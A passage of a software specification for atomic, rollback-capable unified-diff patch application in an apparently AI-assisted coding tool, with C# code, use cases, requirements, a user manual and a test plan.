                        $"No expected hash provided for {file.NewPath}");
                }

                if (!currentHash.AsSpan().SequenceEqual(expectedHash))
                {
                    return new MultiFileToctouResult
                    {
                        Success = false,
                        Error = ToctouError.ContentModified,
                        FailedFile = file.NewPath,
                        Message = $"File {file.NewPath} was modified between validation and application"
                    };
                }
            }

            // Phase 3: Write all patched content to temp files
            foreach (var file in patch.Files)
            {
                var currentContent = await _fs.ReadFileAsync(file.NewPath, ct);
                var patchedContent = ApplyAllHunks(currentContent, file.Hunks);

                var tempPath = file.NewPath + $".atomic-{Guid.NewGuid():N}.tmp";
                await _fs.WriteFileAsync(tempPath, patchedContent, ct);

                tempFiles.Add((tempPath, file.NewPath));
            }

            // Phase 4: Atomic rename all temp files to targets
            foreach (var (tempPath, targetPath) in tempFiles)
            {
                await AtomicRenameAsync(tempPath, targetPath, ct);
            }

            _logger.LogInformation("Successfully applied atomic patch to {Count} files", patch.Files.Count);

            return new MultiFileToctouResult { Success = true };
        }
        catch (Exception ex)
        {
            // Clean up any temp files on failure
            foreach (var (tempPath, _) in tempFiles)
            {
                try { await _fs.DeleteFileAsync(tempPath, ct); }
                catch { /* Best effort */ }
            }

            throw;
        }
        finally
        {
            // Release all locks
            foreach (var lockHandle in locks)
            {
                await lockHandle.DisposeAsync();
            }
        }
    }

    private async Task<IAsyncDisposable> AcquireExclusiveLockAsync(
        string filePath,
        CancellationToken ct)
    {
        // Implementation depends on underlying FS
        // For local files, use FileStream with FileShare.None
        // For docker, use flock command
        return await _fs.AcquireWriteLockAsync(filePath, ct);
    }

    private async Task AtomicRenameAsync(
        string sourcePath,
        string targetPath,
        CancellationToken ct)
    {
        // File.Move with overwrite is atomic on most filesystems
        await _fs.MoveFileAsync(sourcePath, targetPath, overwrite: true, ct);
    }

    private static byte[] ComputeHash(string content)
    {
        return SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(content));
    }

    private string ApplyHunk(string content, PatchHunk hunk)
    {
        // Implementation: apply single hunk to content
        // ... (full implementation in main PatchApplicator)
        throw new NotImplementedException();
    }

    private string ApplyAllHunks(string content, IReadOnlyList<PatchHunk> hunks)
    {
        // Apply hunks in reverse order (bottom-to-top) to preserve line numbers
        var result = content;
        for (int i = hunks.Count - 1; i >= 0; i--)
        {
            result = ApplyHunk(result, hunks[i]);
        }
        return result;
    }
}

public sealed class ToctouSafeResult
{
    public bool Success { get; init; }
    public ToctouError Error { get; init; }
    public string? ExpectedHash { get; init; }
    public string? ActualHash { get; init; }
    public Exception? Exception { get; init; }
}

public sealed class MultiFileToctouResult
{
    public bool Success { get; init; }
    public ToctouError Error { get; init; }
    public string? FailedFile { get; init; }
    public string? Message { get; init; }
}

public enum ToctouError
{
    None,
    ContentModified,
    WriteFailed,
    LockTimeout
}

public class PatchWriteVerificationException : Exception
{
    public PatchWriteVerificationException(string message) : base(message) { }
}

public class PatchValidationException : Exception
{
    public PatchValidationException(string message) : base(message) { }
}
```

---

---

## Use Cases

### Use Case 1: AI-Assisted Code Refactoring with Safety Guarantees

**Persona:** David, Senior Developer at a healthcare software company

**Context:** David works on a legacy EHR (Electronic Health Records) system with over 500,000 lines of C# code. He's using Acode to help refactor authentication modules across 47 files. A single corrupted file could break patient access to critical health information. He needs absolute confidence that changes are either fully applied or completely rolled back.

**Before Atomic Patch Application:**
David would ask the AI to generate code changes, then manually copy-paste each change while praying nothing went wrong mid-process. When his IDE crashed during a refactoring session, he spent 3 hours manually reviewing files to find which were partially modified. One corrupted file made it to staging and caused a critical bug blocking patient login.

**After Atomic Patch Application:**
```bash
$ acode run "Refactor all authentication modules to use the new JWT validation service"

[Planning]
  Analyzing 47 files for authentication patterns...

[Tool: apply_patch]
  Files to modify: 47
  Total hunks: 156

  Preview summary:
    - AuthController.cs: +45/-32 lines
    - JwtValidator.cs: +78/-15 lines
    - UserService.cs: +23/-18 lines
    ... (44 more files)

  Creating transaction backups...
  Applying patch atomically...

  [File 23/47: TokenHandler.cs]
  ❌ Context mismatch at line 145
  Expected: "private readonly ILogger _logger;"
  Actual:   "private readonly ILogger<TokenHandler> _logger;"

  ⚠ Rolling back all 22 applied files...
  ✓ All files restored to original state

[Result]
  Status: ROLLED_BACK
  Files modified: 0 (all rolled back)
  Backup retained: /tmp/acode-backup-2024-01-15-143022/

  Suggestion: File TokenHandler.cs was modified since analysis.
  Run 'acode reanalyze TokenHandler.cs' to update patch.
```

**Metrics:**
- Files protected from corruption: 47 (100%)
- Time to recovery from failure: 0.3 seconds (automatic rollback)
- Data integrity guarantee: 100% (no partial states possible)
- Developer confidence: High (can attempt risky refactors safely)
- Debugging time saved: 3+ hours per failed operation

---

### Use Case 2: Continuous Integration with Automated Code Fixes

**Persona:** Sarah, DevOps Engineer at a fintech startup

**Context:** Sarah manages CI/CD pipelines that automatically apply code style fixes, security patches, and dependency updates. When automated fixes fail partially, it can break builds for the entire team. She needs the patch system to guarantee all-or-nothing semantics for automated code modifications.

**Before Atomic Patch Application:**
The CI pipeline would apply lint fixes directly using sed commands. When the disk filled up mid-fix, half the files were modified. The resulting commit broke the build and 12 developers lost 2 hours each waiting for a fix. Sarah had to implement her own complex rollback scripts.

**After Atomic Patch Application:**
```bash
# In CI pipeline
$ acode apply-patches --batch security-fixes.patch style-fixes.patch dependency-updates.patch

[Batch Patch Application]
  Patches to apply: 3
  Dry run mode: enabled (CI default)

[Validating: security-fixes.patch]
  Files: 12
  Hunks: 34
  Validation: ✓ PASSED

[Validating: style-fixes.patch]
  Files: 89
  Hunks: 245
  Validation: ✓ PASSED

[Validating: dependency-updates.patch]
  Files: 5
  Hunks: 23
  Conflicts detected:
    - package.json:15 - Expected version "4.2.0", found "4.3.1"

  Validation: ✗ FAILED (1 conflict)

[Result]
  Patches applied: 0
  Reason: Pre-flight validation failed
  Action: No files modified, build continues with original code

  Recommendation: Regenerate dependency-updates.patch against current main
```

**Metrics:**
- Build breaks from partial patches: 0 (down from 3/month)
- Developer hours lost to partial fixes: 0 (down from 24/month)
- Confidence in automated fixes: High (dry run catches all issues)
- Rollback script maintenance: None (built-in)
- Pipeline reliability: 99.9% for patch operations

---

### Use Case 3: Multi-File Feature Implementation with Undo Capability

**Persona:** Alex, Junior Developer learning a new codebase

**Context:** Alex is implementing a new feature that touches 15 files including models, services, controllers, and tests. He's using Acode to help write the code, but as a junior developer, he's not always sure the generated code is correct. He needs the ability to easily undo entire feature implementations when they don't work out.

**Before Atomic Patch Application:**
Alex would implement features file by file. When something didn't work, he'd have to manually revert each file using git or IDE history. He often forgot which files were changed and occasionally committed broken code. Senior developers spent time reviewing and fixing his partial implementations.

**After Atomic Patch Application:**
```bash
$ acode run "Implement user notification preferences feature"

[Planning]
  Feature: User Notification Preferences
  Files to create: 3
  Files to modify: 12

[Tool: apply_patch]
  Transaction ID: feat-notif-pref-001

  Creating: NotificationPreference.cs ✓
  Creating: NotificationPreferenceService.cs ✓
  Creating: NotificationPreferenceController.cs ✓
  Modifying: User.cs (+3 lines) ✓
  Modifying: UserService.cs (+45 lines) ✓
  ... (10 more files) ✓

  All 15 files modified successfully.
  Backup retained for 60 minutes.

  Transaction ID: feat-notif-pref-001 (use for rollback)

# Alex tests the feature and finds it doesn't integrate correctly

$ acode rollback feat-notif-pref-001

[Rollback]
  Transaction: feat-notif-pref-001
  Files to restore: 15

  Deleting created file: NotificationPreference.cs ✓
  Deleting created file: NotificationPreferenceService.cs ✓
  Deleting created file: NotificationPreferenceController.cs ✓
  Restoring: User.cs ✓
  Restoring: UserService.cs ✓
  ... (10 more files) ✓

  All files restored to pre-feature state.
  Ready for fresh implementation attempt.
```

**Metrics:**
- Confidence to attempt complex features: High (can always undo)
- Time spent on manual reverts: 0 (down from 30min per failed attempt)
- Partial commits of broken features: 0
- Learning velocity: Increased 40% (safe to experiment)
- Senior developer review time: Reduced 50% (fewer broken states to fix)

---

| Term | Definition |
|------|------------|
| Patch | File modification description |
| Unified Diff | Standard patch format |
| Hunk | Single change block |
| Context Lines | Surrounding lines for matching |
| Atomic | All or nothing |
| Rollback | Undo changes |
| Dry Run | Preview without change |
| Conflict | Context mismatch |
| Fuzz | Line number tolerance |
| Transaction | Grouped operations |
| Backup | Pre-change copy |
| Apply | Execute patch |
| Reject | Failed hunk |
| Offset | Line number adjustment |
| Merge | Combine changes |

---

## Out of Scope

The following items are explicitly excluded from Task 014.c:

- **Three-way merge** - Simple patches only
- **Git integration** - File-level only
- **Conflict resolution** - Report only
- **Semantic merge** - Text-based only
- **Binary patches** - Text files only
- **Rename detection** - Explicit renames only
- **Permission changes** - Content only
- **Interactive editing** - Automatic only

---

## Functional Requirements

### Patch Parsing (FR-014c-01 to FR-014c-05)

| ID | Requirement |
|----|-------------|
| FR-014c-01 | System MUST parse standard unified diff format |
| FR-014c-02 | Parser MUST support multi-file patches with multiple file entries |
| FR-014c-03 | Parser MUST extract hunks with line number ranges |
| FR-014c-04 | Parser MUST extract context lines for matching |
| FR-014c-05 | Parser MUST distinguish between additions, removals, and unchanged context |

### Patch Validation (FR-014c-06 to FR-014c-10)

| ID | Requirement |
|----|-------------|
| FR-014c-06 | Validator MUST verify context lines match current file content |
| FR-014c-07 | Validator MUST verify line numbers are within file bounds |
| FR-014c-08 | Validator MUST verify target files exist (for modification patches) |
| FR-014c-09 | Validator MUST verify encoding compatibility with target files |
| FR-014c-10 | Validation errors MUST include clear, actionable error messages |

### Patch Application (FR-014c-11 to FR-014c-15)

| ID | Requirement |
|----|-------------|
| FR-014c-11 | ApplyPatchAsync MUST apply validated patches to files |
| FR-014c-12 | Application MUST correctly add new lines at specified positions |
| FR-014c-13 | Application MUST correctly remove specified lines |
| FR-014c-14 | Application MUST correctly handle line modifications (remove + add) |
| FR-014c-15 | Application MUST handle patches with multiple hunks in single file |

### Atomicity (FR-014c-16 to FR-014c-20)

| ID | Requirement |
|----|-------------|
| FR-014c-16 | Patch application MUST be all-or-nothing (no partial application) |
| FR-014c-17 | Any failure during application MUST trigger full rollback |
| FR-014c-18 | Rollback MUST restore all files to pre-patch state |
| FR-014c-19 | Multi-file patches MUST apply as single transaction |
| FR-014c-20 | Backups MUST be created before any file modification |

### Dry Run (FR-014c-21 to FR-014c-24)

| ID | Requirement |
|----|-------------|
| FR-014c-21 | PreviewPatchAsync MUST show what changes would be made |
| FR-014c-22 | Preview MUST show added and removed lines per file |
| FR-014c-23 | Preview MUST report potential conflicts without modifying files |
| FR-014c-24 | PreviewPatchAsync MUST NOT modify any files |

### Rollback (FR-014c-25 to FR-014c-28)

| ID | Requirement |
|----|-------------|
| FR-014c-25 | RollbackPatchAsync MUST restore files to pre-patch state |
| FR-014c-26 | Rollback MUST restore original content from backup |
| FR-014c-27 | Rollback window (retention period) MUST be configurable |
| FR-014c-28 | Rollback MUST cleanup backup files after successful restore |

### Conflict Detection (FR-014c-29 to FR-014c-32)

| ID | Requirement |
|----|-------------|
| FR-014c-29 | System MUST detect context line mismatches |
| FR-014c-30 | System MUST detect when expected lines are at different positions |
| FR-014c-31 | System MUST detect when file was modified since patch generation |
| FR-014c-32 | Conflicts MUST be reported with specific line numbers and content |

### Fuzz Matching (FR-014c-33 to FR-014c-36)

| ID | Requirement |
|----|-------------|
| FR-014c-33 | Fuzz factor MUST be configurable (number of lines to search) |
| FR-014c-34 | Default fuzz factor MUST be 3 lines |
| FR-014c-35 | System MUST track line offset when fuzz matching succeeds |
| FR-014c-36 | Applied offset MUST be reported in patch result |

### Multi-File Patches (FR-014c-37 to FR-014c-40)

| ID | Requirement |
|----|-------------|
| FR-014c-37 | Parser MUST correctly separate files in multi-file patches |
| FR-014c-38 | Multi-file patches MUST apply as single atomic transaction |
| FR-014c-39 | Failure in any file MUST rollback all files in patch |
| FR-014c-40 | Result MUST report status for each file in patch |

### Result Reporting (FR-014c-41 to FR-014c-45)

| ID | Requirement |
|----|-------------|
| FR-014c-41 | PatchResult MUST indicate success or failure |
| FR-014c-42 | PatchResult MUST include count of applied hunks |
| FR-014c-43 | PatchResult MUST include details of any rejected hunks |
| FR-014c-44 | PatchResult MUST include offset information if fuzz applied |
| FR-014c-45 | PatchResult MUST include conflict details if validation failed |

---

## Non-Functional Requirements

### Performance (NFR-014c-01 to NFR-014c-03)

| ID | Category | Requirement |
|----|----------|-------------|
| NFR-014c-01 | Performance | Simple single-hunk patch MUST apply in < 10ms |
| NFR-014c-02 | Performance | Complex multi-hunk patch MUST apply in < 100ms |
| NFR-014c-03 | Performance | Multi-file patches MUST apply at < 50ms per file |

### Reliability (NFR-014c-04 to NFR-014c-06)

| ID | Category | Requirement |
|----|----------|-------------|
| NFR-014c-04 | Reliability | Partial patch application MUST never occur |
| NFR-014c-05 | Reliability | Rollback MUST always succeed when backups exist |
| NFR-014c-06 | Reliability | File corruption from patch operations MUST be impossible |

### Safety (NFR-014c-07 to NFR-014c-09)

| ID | Category | Requirement |
|----|----------|-------------|
| NFR-014c-07 | Safety | Backup MUST be created before any file modification |
| NFR-014c-08 | Safety | Patch MUST be fully validated before any modification |
| NFR-014c-09 | Safety | Error messages MUST provide clear guidance for resolution |

### Maintainability (NFR-014c-10 to NFR-014c-12)

| ID | Category | Requirement |
|----|----------|-------------|
| NFR-014c-10 | Maintainability | Dry run output MUST clearly show intended changes |
| NFR-014c-11 | Maintainability | Conflict messages MUST identify specific mismatched content |
| NFR-014c-12 | Maintainability | All patch operations MUST be logged with sufficient detail |

---

## User Manual Documentation

### Overview

The patch system applies changes to files atomically. Patches are unified diffs generated by the agent or external tools.

### Unified Diff Format

```diff
--- a/src/Program.cs
+++ b/src/Program.cs
@@ -10,6 +10,7 @@
 using System;
 using System.Collections.Generic;
+using System.Linq;
 
 namespace MyApp
 {
```

Key parts:
- `---` / `+++`: Old and new file paths
- `@@`: Hunk header (line numbers)
- `-`: Removed line
- `+`: Added line
- ` `: Context line (unchanged)

### Applying Patches

```csharp
var patch = @"
--- a/src/Program.cs
+++ b/src/Program.cs
@@ -10,3 +10,4 @@
 using System;
+using System.Linq;
";

var result = await repoFS.ApplyPatchAsync(patch);

if (result.Success)
{
    Console.WriteLine($"Applied {result.HunksApplied} hunks");
}
else
{
    Console.WriteLine($"Failed: {result.Error}");
    foreach (var conflict in result.Conflicts)
    {
        Console.WriteLine($"  {conflict.File}: {conflict.Reason}");
    }
}
```

### Dry Run

Preview changes before applying:

```csharp
var preview = await repoFS.PreviewPatchAsync(patch);

foreach (var file in preview.Files)
{
    Console.WriteLine($"Would modify: {file.Path}");
    foreach (var hunk in file.Hunks)
    {
        Console.WriteLine($"  Lines {hunk.StartLine}-{hunk.EndLine}");
    }
}

if (preview.HasConflicts)
{
    Console.WriteLine("⚠ Conflicts detected!");
}
```

### Rollback

Undo the last patch:

```csharp
var rollback = await repoFS.RollbackLastPatchAsync();

if (rollback.Success)
{
    Console.WriteLine("Rolled back successfully");
}
```

### Configuration

```yaml
# .agent/config.yml
patching:
  # Fuzz factor (lines)
  fuzz: 3
  
  # Keep backups for rollback
  backup:
    enabled: true
    retention_minutes: 60
    
  # Dry run by default
  dry_run_default: false
```

### CLI Integration

```bash
$ acode run "Add error handling to the API controller"

[Tool: apply_patch]
  File: src/Controllers/ApiController.cs
  Hunks: 3
  
  Preview:
    + try {
    +     var result = await _service.ProcessAsync(request);
    + } catch (Exception ex) {
    +     _logger.LogError(ex, "Processing failed");
    +     return StatusCode(500);
    + }
  
  Apply changes? [y/N]
```

### Troubleshooting

#### Context Mismatch

**Problem:** Patch doesn't match current file

**Causes:**
1. File changed since patch created
2. Wrong file version
3. Line endings differ

**Solutions:**
1. Regenerate patch
2. Increase fuzz factor
3. Normalize line endings

#### Hunk Rejected

**Problem:** Some changes failed

**Causes:**
1. Context doesn't match
2. Lines already removed
3. Conflicting changes

**Solutions:**
1. Review rejected hunks
2. Apply manually
3. Regenerate patch

#### Multi-File Failure

**Problem:** Transaction rolled back

**Causes:**
1. One file failed, all rolled back
2. Check individual file errors

**Solutions:**
1. Fix failing file
2. Apply separately
3. Check all files first

---

## Acceptance Criteria

### Parsing

- [ ] AC-001: Unified diff parsed
- [ ] AC-002: Hunks extracted
- [ ] AC-003: Multi-file parsed

### Validation

- [ ] AC-004: Context validated
- [ ] AC-005: Lines validated
- [ ] AC-006: Errors reported

### Application

- [ ] AC-007: Additions work
- [ ] AC-008: Removals work
- [ ] AC-009: Modifications work
- [ ] AC-010: Multi-hunk works

### Atomicity

- [ ] AC-011: All-or-nothing
- [ ] AC-012: Failure rollback
- [ ] AC-013: Backup created

### Dry Run

- [ ] AC-014: Preview works
- [ ] AC-015: No modifications
- [ ] AC-016: Conflicts shown

### Rollback

- [ ] AC-017: Rollback works
- [ ] AC-018: Original restored
- [ ] AC-019: Cleanup works

---

## Best Practices

### Atomicity

1. **Write to temp first** - Write changes to temp file, then atomic rename
2. **Verify before commit** - Validate patch applied correctly before replacing original
3. **Keep backup until success** - Don't delete backup until new file confirmed written
4. **Use transactions conceptually** - Apply all changes or none; no partial states

### Rollback Strategy

5. **Journal changes** - Record each modification for potential undo
6. **Restore original content** - Keep original bytes until patch fully applied
7. **Handle rollback failures** - If rollback fails, enter safe mode and report
8. **Clean up temp files** - Remove all temp/backup files on success

### Patch Validation

9. **Parse before apply** - Validate patch syntax completely before modifying files
10. **Check context matches** - Verify context lines match actual file content
11. **Handle fuzzy matching** - Allow configurable line offset tolerance
12. **Report conflicts clearly** - Show expected vs actual content when patches fail

---

## Testing Requirements

### Unit Tests

```
Tests/Unit/Patching/
├── PatchParserTests.cs
│   ├── Should_Parse_Simple_Diff()
│   ├── Should_Parse_Unified_Diff_Header()
│   ├── Should_Parse_Single_Hunk()
│   ├── Should_Parse_Multi_Hunk()
│   ├── Should_Parse_Multi_File()
│   ├── Should_Parse_New_File()
│   ├── Should_Parse_Deleted_File()
│   ├── Should_Parse_Renamed_File()
│   ├── Should_Extract_Line_Numbers()
│   ├── Should_Extract_Context_Lines()
│   ├── Should_Extract_Added_Lines()
│   ├── Should_Extract_Removed_Lines()
│   ├── Should_Handle_No_Newline_At_EOF()
│   ├── Should_Handle_Empty_Patch()
│   └── Should_Reject_Malformed_Patch()
│
├── PatchValidatorTests.cs
│   ├── Should_Validate_Context_Matches()
│   ├── Should_Detect_Context_Mismatch()
│   ├── Should_Detect_Line_Already_Removed()
│   ├── Should_Detect_Line_Already_Added()
│   ├── Should_Allow_Fuzz_Factor()
│   ├── Should_Respect_Max_Fuzz()
│   ├── Should_Validate_Line_Numbers()
│   ├── Should_Handle_Modified_File()
│   ├── Should_Handle_Missing_File()
│   ├── Should_Report_All_Errors()
│   └── Should_Return_Conflict_Details()
│
├── PatchApplicatorTests.cs
│   ├── Should_Apply_Single_Addition()
│   ├── Should_Apply_Multiple_Additions()
│   ├── Should_Apply_Single_Removal()
│   ├── Should_Apply_Multiple_Removals()
│   ├── Should_Apply_Modification()
│   ├── Should_Apply_Multi_Hunk()
│   ├── Should_Apply_In_Reverse_Order()
│   ├── Should_Apply_With_Fuzz()
│   ├── Should_Create_New_File()
│   ├── Should_Delete_File()
│   ├── Should_Apply_Atomically()
│   ├── Should_Rollback_On_Failure()
│   ├── Should_Create_Backup()
│   ├── Should_Preserve_File_Permissions()
│   └── Should_Preserve_Line_Endings()
│
├── MultiFilePatchTests.cs
│   ├── Should_Apply_All_Files()
│   ├── Should_Rollback_All_On_Failure()
│   ├── Should_Apply_In_Order()
│   ├── Should_Handle_Partial_Failure()
│   └── Should_Report_Per_File_Status()
│
├── DryRunTests.cs
│   ├── Should_Preview_Changes()
│   ├── Should_Not_Modify_Files()
│   ├── Should_Show_Added_Lines()
│   ├── Should_Show_Removed_Lines()
│   ├── Should_Show_Conflicts()
│   └── Should_Validate_All_Hunks()
│
├── PatchRollbackTests.cs
│   ├── Should_Rollback_Single_File()
│   ├── Should_Rollback_Multi_File()
│   ├── Should_Restore_Original_Content()
│   ├── Should_Restore_Deleted_File()
│   ├── Should_Delete_Created_File()
│   ├── Should_Handle_Missing_Backup()
│   ├── Should_Cleanup_Backup_After_Rollback()
│   └── Should_Respect_Retention_Period()
│
└── PatchLineEndingTests.cs
    ├── Should_Handle_LF_Files()
    ├── Should_Handle_CRLF_Files()
    ├── Should_Handle_Mixed_Line_Endings()
    └── Should_Preserve_Original_Line_Endings()
```

### Integration Tests

```
Tests/Integration/Patching/
├── PatchIntegrationTests.cs
│   ├── Should_Apply_Complex_Patch()
│   ├── Should_Apply_Large_Patch()
│   ├── Should_Apply_To_Large_File()
│   ├── Should_Handle_Binary_Detection()
│   ├── Should_Work_With_Real_Git_Diff()
│   └── Should_Handle_Concurrent_Patches()
│
└── PatchAtomicityIntegrationTests.cs
    ├── Should_Survive_Process_Crash()
    ├── Should_Recover_From_Partial_Apply()
    └── Should_Handle_Disk_Full()
```

### E2E Tests

```
Tests/E2E/Patching/
├── PatchE2ETests.cs
│   ├── Should_Apply_Via_Agent_Tool()
│   ├── Should_Preview_Via_Agent_Tool()
│   ├── Should_Rollback_Via_Agent_Tool()
│   ├── Should_Work_With_Confirmation_Flow()
│   └── Should_Handle_User_Rejection()
```

### Performance Benchmarks

| Benchmark | Target | Maximum |
|-----------|--------|---------|
| Simple patch | 5ms | 10ms |
| Multi-hunk | 15ms | 30ms |
| Multi-file | 25ms | 50ms |
| Rollback | 10ms | 25ms |

---

## User Verification Steps

### Scenario 1: Simple Patch

1. Create file with known content
2. Create patch to add line
3. Apply patch
4. Verify: Line added

### Scenario 2: Multi-Hunk

1. Create file
2. Create patch with 3 hunks
3. Apply patch
4. Verify: All hunks applied

### Scenario 3: Rollback

1. Apply patch
2. Rollback
3. Verify: Original restored

### Scenario 4: Dry Run

1. Create patch
2. Preview
3. Verify: No changes made
4. Verify: Preview accurate

### Scenario 5: Conflict

1. Create patch
2. Modify file differently
3. Apply patch
4. Verify: Conflict reported

---

## Implementation Prompt

### File Structure

```
src/AgenticCoder.Domain/
├── Patching/
│   ├── Patch.cs
│   ├── Hunk.cs
│   ├── PatchResult.cs
│   └── PatchConflict.cs
│
src/AgenticCoder.Infrastructure/
├── FileSystem/
│   └── Patching/
│       ├── UnifiedDiffParser.cs
│       ├── PatchValidator.cs
│       ├── PatchApplicator.cs
│       ├── PatchRollback.cs
│       └── FuzzMatcher.cs
```

### PatchApplicator Class

```csharp
namespace AgenticCoder.Infrastructure.FileSystem.Patching;

public sealed class PatchApplicator
{
    public async Task<PatchResult> ApplyAsync(
        IRepoFS fs,
        Patch patch,
        PatchOptions options,
        CancellationToken ct)
    {
        // Validate first
        var validation = await _validator.ValidateAsync(fs, patch, ct);
        if (!validation.IsValid)
            return PatchResult.Failed(validation.Errors);
        
        // Create backups
        var backups = await CreateBackupsAsync(fs, patch.Files, ct);
        
        try
        {
            // Apply each file
            foreach (var file in patch.Files)
            {
                await ApplyFileAsync(fs, file, options, ct);
            }
            
            return PatchResult.Success(patch.Hunks.Count);
        }
        catch
        {
            // Rollback on failure
            await RestoreBackupsAsync(fs, backups, ct);
            throw;
        }
    }
}
```

### Error Codes

| Code | Meaning |
|------|---------|
| ACODE-PAT-001 | Parse error |
| ACODE-PAT-002 | Validation failed |
| ACODE-PAT-003 | Context mismatch |
| ACODE-PAT-004 | Apply failed |
| ACODE-PAT-005 | Rollback failed |

### Implementation Checklist

1. [ ] Create diff parser
2. [ ] Create validator
3. [ ] Create applicator
4. [ ] Implement atomicity
5. [ ] Implement dry run
6. [ ] Implement rollback
7. [ ] Add fuzz matching
8. [ ] Write tests

### Rollout Plan

1. **Phase 1:** Parser
2. **Phase 2:** Validator
3. **Phase 3:** Simple apply
4. **Phase 4:** Atomicity
5. **Phase 5:** Rollback

---

**End of Task 014.c Specification**